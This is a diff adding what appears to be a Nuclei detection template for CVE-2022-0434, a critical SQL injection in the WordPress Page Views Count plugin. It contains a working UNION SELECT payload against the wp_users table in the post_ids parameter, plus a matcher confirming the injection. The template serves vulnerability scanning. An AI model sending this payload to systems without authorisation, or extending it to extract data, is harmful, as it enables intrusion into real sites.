@@ -1,0 +1,32 @@
+id: CVE-2022-0434
+info:
+  name: WordPress PageViewsCount Plugin SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Page Views Count WordPress Plugin versions below 2.4.15 are vulnerable to SQL Injection via the `post_ids` parameter. This allows attackers to execute arbitrary SQL commands.
+  reference:
+    - https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip
+    - https://wordpress.org/plugins/page-views-count/
+    - https://fofa.so/
+  classification:
+    cve-id: CVE-2022-0434
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: sqli,wordpress,plugin
+
+http:
+  - raw:
+      - |
+        GET /?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(1423),md5(1423),md5(1423)%20from%20wp_users%20--%20g HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "856fc81623da2150ba2210ba1b51d241"
